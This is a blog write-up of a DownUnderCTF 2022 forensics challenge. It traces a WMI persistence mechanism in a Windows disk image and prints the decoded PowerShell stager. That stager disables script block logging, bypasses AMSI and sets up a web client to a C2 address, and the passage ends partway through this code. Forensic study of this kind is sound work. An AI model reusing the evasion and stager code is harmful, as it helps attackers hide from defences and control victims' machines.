<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://samiko.me/images/profile.jpg">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>DFIR Investigation - DownUnderCTF 2022 Writeup&nbsp;|&nbsp;samiko@127.0.0.1~$</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="DFIR Investigation - DownUnderCTF 2022 Writeup">
  
    <meta name="description" content="A digital forensics and incident response challenge on deobfuscating a C2 persistence PowerShell stager, using ActivitiesCache.db to reveal past user activities, and recovering resident data from the NTFS Master File Table.">
    <meta property="og:description" content="A digital forensics and incident response challenge on deobfuscating a C2 persistence PowerShell stager, using ActivitiesCache.db to reveal past user activities, and recovering resident data from the NTFS Master File Table.">
  
  
    <meta property="og:image" content="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;üîé&lt;/text&gt;&lt;/svg&gt;">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="/">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://samiko.me/images/profile.jpg"></span>&nbsp;
      
      <span>Home</span>
    </div>
  </a>
  
</nav>
  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;üîé&lt;/text&gt;&lt;/svg&gt;"></span>
      </div>
    
    <h1 class="Header__Title">DFIR Investigation - DownUnderCTF 2022 Writeup</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sat, Oct 8, 2022</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
            <a href="tag/DownUnderCTF_2022">DownUnderCTF 2022</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--gray">
            <a href="tag/Forensics">Forensics</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--purple">
            <a href="tag/Code_Deobfuscation">Code Deobfuscation</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
            <a href="tag/ActivitiesCache">ActivitiesCache</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
            <a href="tag/MFT">MFT</a>
          </span>
        
      </div>
      <div>
        A digital forensics and incident response challenge on deobfuscating a C2 persistence PowerShell stager, using ActivitiesCache.db to reveal past user activities, and recovering resident data from the NTFS Master File Table.
      </div>
    
  </header>
  <article id="https://www.notion.so/dc950db5b006438fa7c29f11a716140c" class="PageRoot PageRoot--FullWidth"><h3 id="https://www.notion.so/db5a242380ae445abd8e5d7af28aaa57" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/db5a242380ae445abd8e5d7af28aaa57"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Preface</span></span></h3><div id="https://www.notion.so/cd99b39e5bcc4230b9c81235b0f7e14e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Recently, I participated in DownUnderCTF 2022 with my team AdelaideB9. We came 57th out of around 2,000 teams and couldn‚Äôt be happier. I really enjoyed the challenges, they were original, frustrating at times, but interesting and educational overall. The highlight for me would have to go to the ‚ÄúDFIR Investigation‚Äù, which is a two-part Windows digital forensics challenge. It covers aspects of the NTFS file system and Windows logging mechanisms that I never knew existed before.</span></span></p></div><h3 id="https://www.notion.so/cc830b060f884af79ddc0bfde0cb2d8a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/cc830b060f884af79ddc0bfde0cb2d8a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Challenge description</span></span></h3><div id="https://www.notion.so/2515cc9154f945c5a82401dfc29d9e3b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">An attacker has installed a C2 persistence mechanism on this system.</span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/80965b8ab3454a93947da3c7ea84c8c9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">When is it scheduled to next execute?</span></span></li><li id="https://www.notion.so/d81fef6a84554d90a27a6b6a3ad00707" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">What C2 IP address is the PowerShell stager configured to connect to?</span></span></li></ul><div id="https://www.notion.so/eabaff6e4e2742d9839ba17a237f71c8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Flag 1 format:¬†</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DUCTF{hh:mm_IP}</code></span></span></p></div><div id="https://www.notion.so/7f122887d05244fb842223f496134c28" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Flag 1 example:¬†</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DUCTF{15:27_10.0.0.8}</code></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/aa37471c95534ee8a4e8c9638d6c0252" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">What time was¬†</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwd.txt</code></span><span class="SemanticString">¬†first opened by the user Challenger?</span></span></li><li id="https://www.notion.so/c11c940bde24410aa003e86f4321282b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">What string was contained in¬†</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwd.txt</code></span><span class="SemanticString">?</span></span></li></ul><div id="https://www.notion.so/942257e3abf14a329d5351e0ac426b74" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Flag 2 format:¬†</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DUCTF{hh:mm:ss_string}</code></span></span></p></div><div id="https://www.notion.so/e88d4224a135417086874c1b3bc746c1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Flag 2 example:¬†</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DUCTF{18:13:45_hunter2}</code></span></span></p></div><a id="https://www.notion.so/226a514a9808482aa3ef9bad268b5a36" class="File" href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4de32ce6-cccc-4039-8671-d7d7959c0e6d%2Fdfir-investigation.zip?table=block&amp;id=226a514a-9808-482a-a3ef-9bad268b5a36"><div><div class="File__Icon"><svg viewBox="0 0 30 30" style="width:1.35em;height:1.35em;fill:inherit"><g><path d="M22,8v12c0,3.866-3.134,7-7,7s-7-3.134-7-7V8c0-2.762,2.238-5,5-5s5,2.238,5,5v12c0,1.657-1.343,3-3,3s-3-1.343-3-3V8h-2v12c0,2.762,2.238,5,5,5s5-2.238,5-5V8c0-3.866-3.134-7-7-7S6,4.134,6,8v12c0,4.971,4.029,9,9,9s9-4.029,9-9V8H22z"></path></g></svg></div><div><span class="File__Title">dfir-investigation.zip</span><span class="File__Size">322231.7KB</span></div></div></a><div id="https://www.notion.so/8fedfe64bfc248188554f65ec712d1da" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">File password:¬†</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Awt4Wh6dT3by0hXmfFZn</code></span></span></p></div><div id="https://www.notion.so/f49faee510734bcd8986b4c3b2e73a86" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Author: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">keebs#2222</code></span></span></p></div><h3 id="https://www.notion.so/7c9c3e37a75a46eb863247d1d4363666" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/7c9c3e37a75a46eb863247d1d4363666"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Investigating the AD1 image</span></span></h3><div id="https://www.notion.so/4397c48669c542bfb86b0b818ae3d9ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We are given a ZIP file which we can extract with the password provided in the challenge description, producing a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">triage-image.ad1</code></span><span class="SemanticString"> AD1 file.</span></span></p></div><div id="https://www.notion.so/ed3d51b7fde94624836da237ee1d7733" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Searching for this specific file extension, we see that it is a proprietary disk image file used in Accessdata‚Äôs FTK Forensic Toolkit. Normally this toolkit would cost $4000, but here we only need the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://accessdata.com/product-download/ftk-imager-version-4-5">Imager tool</a></span><span class="SemanticString"> to process the file, which is free fortunately.</span></span></p></div><div id="https://www.notion.so/19448c448f3a4da6bb8156555cf8bcd5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To start, we will import the image by navigating to </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">File ‚Üí Add Evidence Item</strong></span><span class="SemanticString">, then selecting </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Image File.</strong></span></span></p></div><div id="https://www.notion.so/27a1788a44d54e98bfb674c9dffa8713" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6fab7372-6a99-4e64-997b-2f1a91153859%2FUntitled.png?width=2352&amp;table=block&amp;id=27a1788a-44d5-4e98-bfb6-74c9dffa8713"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6fab7372-6a99-4e64-997b-2f1a91153859%2FUntitled.png?width=2352&amp;table=block&amp;id=27a1788a-44d5-4e98-bfb6-74c9dffa8713" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/06561ecb34564a07b4a82db37d7d9b9c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To make it easier for us to investigate individual files, we will extract all files from the image by right-clicking the root folder and selecting </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Extract Files</strong></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/5f61b7eba592478ead93599e8ca0f86a" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3034ea36-2f08-4c54-8cd7-3a9fce159259%2FUntitled.png?width=384&amp;table=block&amp;id=5f61b7eb-a592-478e-ad93-599e8ca0f86a"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3034ea36-2f08-4c54-8cd7-3a9fce159259%2FUntitled.png?width=384&amp;table=block&amp;id=5f61b7eb-a592-478e-ad93-599e8ca0f86a" style="width:384px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><h3 id="https://www.notion.so/0dac86e6aad945c5a8f0651d03c60a4e" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/0dac86e6aad945c5a8f0651d03c60a4e"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Finding the C2 persistence mechanism</span></span></h3><div id="https://www.notion.so/c8726051830f47b591cd1857929d3874" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As the challenge description mentions that the C2 mechanism has a PowerShell stager, we can try to find traces of it by recursively searching for the string ‚Äúpowershell‚Äù with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">grep</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/c19e296a79b1466c9d1d55b8bdf914b6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ grep -a -r &quot;powershell&quot;</code></span></span></p></div><div id="https://www.notion.so/3e5cd3f964cb425ab71321c39e47fbff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Note that we are using the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-a</code></span><span class="SemanticString"> option here to show binary files as text, so that we don‚Äôt miss anything in those files.</span></span></p></div><div id="https://www.notion.so/8195e15626a244cfa3ace8fda5d29fd6" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F00bbfc4f-1523-439c-be61-48b632e5e2d3%2FUntitled.png?width=912&amp;table=block&amp;id=8195e156-26a2-44cf-a3ac-e8fda5d29fd6"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F00bbfc4f-1523-439c-be61-48b632e5e2d3%2FUntitled.png?width=912&amp;table=block&amp;id=8195e156-26a2-44cf-a3ac-e8fda5d29fd6" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/9df079d07e274299b285e542655d2856" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">At the end of the output, we see a suspicious Base64-encoded string being passed to PowerShell in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Windows\System32\wbem\Repository\OBJECTS.DATA</code></span><span class="SemanticString"> file, which stores all objects managed by Windows Management Instrumentation (WMI). It is uncommon for a genuine application to be executing an encoded command with PowerShell, especially not with a hidden window style (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-W hidden</code></span><span class="SemanticString">) and in non-interactive mode (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-NonI</code></span><span class="SemanticString">). This has the signature of a malware dropper or some kind of payload stager and should be investigated.</span></span></p></div><h3 id="https://www.notion.so/21182c3884674b65a68e8372b302ae01" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/21182c3884674b65a68e8372b302ae01"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Analysing the PowerShell stager</span></span></h3><div id="https://www.notion.so/e6e7737e912444bca93cfeb7078af236" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Immediately, we can see when this stager is scheduled to run in this SQL-like segment:</span></span></p></div><pre id="https://www.notion.so/49db00e6e1c64c71ad905e417cff0219" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> __InstanceModificationEvent <span class="token keyword">WITHIN</span> <span class="token number">60</span> <span class="token keyword">WHERE</span> TargetInstance ISA <span class="token string">'Win32_LocalTime'</span> <span class="token operator">AND</span> </span></span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><span>TargetInstance<span class="token punctuation">.</span><span class="token keyword">Hour</span> <span class="token operator">=</span> <span class="token number">12</span></span></strong></span></span><span class="SemanticString"><span> <span class="token operator">AND</span> </span></span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><span>TargetInstance<span class="token punctuation">.</span><span class="token keyword">Minute</span><span class="token operator">=</span> <span class="token number">38</span></span></strong></span></span><span class="SemanticString"><span> <span class="token keyword">GROUP</span> <span class="token keyword">WITHIN</span> <span class="token number">60</span>
WQLBBFCCB444CF66AA09AE6F15967A6865175BB0ED216D19970A7988B72CDF0A3A4xÔøΩ@ÔøΩÔøΩ_ÔøΩ<span class="token operator">%</span>ﬂ¨ÔøΩ<span class="token punctuation">)</span>ÔøΩÔøΩÔøΩÔøΩÔøΩ"ÔøΩÔøΩ‚ñíÔøΩÔøΩCommandLineEventConsumerC:\Windows\System32\WindowsPowerShell\v1<span class="token punctuation">.</span><span class="token number">0</span>\powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>NonI <span class="token operator">-</span>W hidden <span class="token operator">-</span>enc SQBGACgAJ<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span></span></span></code></pre><div id="https://www.notion.so/5b7c8e2dd5bc41fe912ef9ce85f1b4e8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">TargetInstance</code></span><span class="SemanticString"> variable gives us the time of when the stager might be scheduled to run, </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">12:38</strong></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/917f688264d64a60bdc3621fdcb61d90" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Decoding the Base64 string with the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">base64</code></span><span class="SemanticString"> utility:</span></span></p></div><div id="https://www.notion.so/a4707143bc404c07afdf7abb893610e9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ echo &quot;SQBGACgAJ...&quot; | base64 -d</code></span></span></p></div><pre id="https://www.notion.so/d878c1295b5a404e9a0b94be1beaae67" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">IF</span><span class="token punctuation">(</span><span class="token variable">$PSVErSiONTaBLe</span><span class="token punctuation">.</span>PSVErsIOn<span class="token punctuation">.</span>MajOr <span class="token operator">-ge</span> 3<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$f0C32</span>=<span class="token namespace">[ReF]</span><span class="token punctuation">.</span>ASSemblY<span class="token punctuation">.</span>GetTYpe<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.Utils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"GETFiE`ld"</span><span class="token punctuation">(</span><span class="token string">'cachedGroupPolicySettings'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token operator">+</span><span class="token string">'onPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">IF</span><span class="token punctuation">(</span><span class="token variable">$F0c32</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$ea761</span>=<span class="token variable">$F0c32</span><span class="token punctuation">.</span>GEtVAlue<span class="token punctuation">(</span><span class="token variable">$NuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">If</span><span class="token punctuation">(</span><span class="token variable">$ea761</span><span class="token punctuation">[</span><span class="token string">'ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$eA761</span><span class="token punctuation">[</span><span class="token string">'ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'EnableScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span>=0<span class="token punctuation">;</span><span class="token variable">$ea761</span><span class="token punctuation">[</span><span class="token string">'ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'EnableScriptBlockInvocationLogging'</span><span class="token punctuation">]</span>=0<span class="token punctuation">}</span><span class="token variable">$Val</span>=<span class="token namespace">[COllEctIoNs.GeNerIC.DICtIonaRY[StRiNg,SysTEM.OBJEct]]</span>::NEw<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$VAL</span><span class="token punctuation">.</span>ADD<span class="token punctuation">(</span><span class="token string">'EnableScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">,</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$VaL</span><span class="token punctuation">.</span>ADD<span class="token punctuation">(</span><span class="token string">'EnableScriptBlockInvocationLogging'</span><span class="token punctuation">,</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Ea761</span><span class="token punctuation">[</span><span class="token string">'HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span>=<span class="token variable">$val</span><span class="token punctuation">}</span><span class="token keyword">ElSe</span><span class="token punctuation">{</span><span class="token namespace">[ScRIpTBlOck]</span><span class="token punctuation">.</span><span class="token string">"GETFie`ld"</span><span class="token punctuation">(</span><span class="token string">'signatures'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token operator">+</span><span class="token string">'onPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetVAlUe<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">NEW-OBjECt</span> CoLLEctIONs<span class="token punctuation">.</span>GEnERic<span class="token punctuation">.</span>HAsHSeT<span class="token namespace">[stRinG]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token variable">$REf</span>=<span class="token namespace">[REf]</span><span class="token punctuation">.</span>AsSEmbLy<span class="token punctuation">.</span>GEtTYPe<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.Amsi'</span><span class="token operator">+</span><span class="token string">'Utils'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$REf</span><span class="token punctuation">.</span>GeTFIeLd<span class="token punctuation">(</span><span class="token string">'amsiInitF'</span><span class="token operator">+</span><span class="token string">'ailed'</span><span class="token punctuation">,</span><span class="token string">'NonPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SEtValUE<span class="token punctuation">(</span><span class="token variable">$NuLL</span><span class="token punctuation">,</span><span class="token boolean">$trUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token namespace">[SystEm.Net.SErvICEPointMANagER]</span>::ExpECt100COntiNUE=0<span class="token punctuation">;</span><span class="token variable">$b3904</span>=<span class="token function">NEw-OBJECt</span> SYstem<span class="token punctuation">.</span>NeT<span class="token punctuation">.</span>WebCLIeNT<span class="token punctuation">;</span><span class="token variable">$u</span>=<span class="token string">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span><span class="token punctuation">;</span><span class="token variable">$ser</span>=$<span class="token punctuation">(</span><span class="token namespace">[TeXT.EnCODing]</span>::UNICOdE<span class="token punctuation">.</span>GeTSTrINg<span class="token punctuation">(</span><span class="token namespace">[ConVERT]</span>::FRomBAsE64StRiNg<span class="token punctuation">(</span><span class="token string">'aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIANwA6ADcANwA3ADcA'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$t</span>=<span class="token string">'/admin/get.php'</span><span class="token punctuation">;</span><span class="token variable">$b3904</span><span class="token punctuation">.</span>HeAdeRs<span class="token punctuation">.</span>AdD<span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">,</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b3904</span><span class="token punctuation">.</span>PRoXy=<span class="token namespace">[SysTEm.NeT.WEbREqUest]</span>::DEFaultWEBPrOXy<span class="token punctuation">;</span><span class="token variable">$b3904</span><span class="token punctuation">.</span>PRoXy<span class="token punctuation">.</span>CREdenTials = <span class="token namespace">[SYstem.NeT.CREdENtIaLCaChE]</span>::DEFAultNetWOrKCredEnTiAlS<span class="token punctuation">;</span><span class="token variable">$Script</span>:Proxy = <span class="token variable">$b3904</span><span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token variable">$K</span>=<span class="token namespace">[SYSteM.TexT.EnCODINg]</span>::ASCII<span class="token punctuation">.</span>GeTByTes<span class="token punctuation">(</span><span class="token string">'/Y0dzf;_)NkL^~M#K(xG]*rOFe,C}2%R'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 